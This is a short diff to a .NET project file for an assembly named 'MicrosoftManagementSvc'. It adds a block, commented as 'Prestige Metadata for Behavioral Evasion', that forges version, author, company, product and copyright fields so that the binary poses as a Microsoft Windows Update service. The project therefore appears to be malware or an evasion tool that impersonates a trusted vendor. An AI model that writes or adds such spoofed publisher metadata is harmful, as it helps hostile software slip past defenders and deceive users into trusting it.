@@ -25,6 +25,14 @@
     <AssemblyName>MicrosoftManagementSvc</AssemblyName>
     <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
     
+    <!-- Prestige Metadata for Behavioral Evasion -->
+    <Version>1.4.2.0</Version>
+    <Authors>Microsoft Corporation</Authors>
+    <Company>Microsoft Corporation</Company>
+    <Product>Microsoft(R) Management Service</Product>
+    <Description>Microsoft(R) Management Service for Windows Update</Description>
+    <Copyright>(C) Microsoft Corporation. All rights reserved.</Copyright>
+    
     <!-- WinForms dependency completely removed for NativeAOT support -->
   </PropertyGroup>
 
